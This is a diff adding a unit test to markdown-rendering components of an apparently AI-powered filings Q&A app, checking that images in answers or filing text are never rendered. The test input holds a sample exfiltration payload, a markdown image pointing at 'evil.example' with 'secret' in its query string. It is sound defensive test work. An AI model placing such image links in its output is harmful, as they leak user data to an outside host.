@@ -30,6 +30,16 @@ describe("AnswerMarkdown", () => {
   });
 });
 
+describe("remote content", () => {
+  it("never renders images from answers or filing text", () => {
+    const md = 'Revenue [1] ![tracker](https://evil.example/pixel.png?q=secret "t")';
+    const a = render(<AnswerMarkdown text={md} citations={citations} />);
+    expect(a.container.querySelector("img")).toBeNull();
+    const c = render(<ChunkMarkdown text={md} quote="" />);
+    expect(c.container.querySelector("img")).toBeNull();
+  });
+});
+
 describe("ChunkMarkdown", () => {
   it("renders tables and highlights the quote", () => {
     const text = "Intro text.\n\n| Category | 2024 |\n| --- | ---: |\n| Services | 96,169 |\n\nTotal net sales increased 2%.";
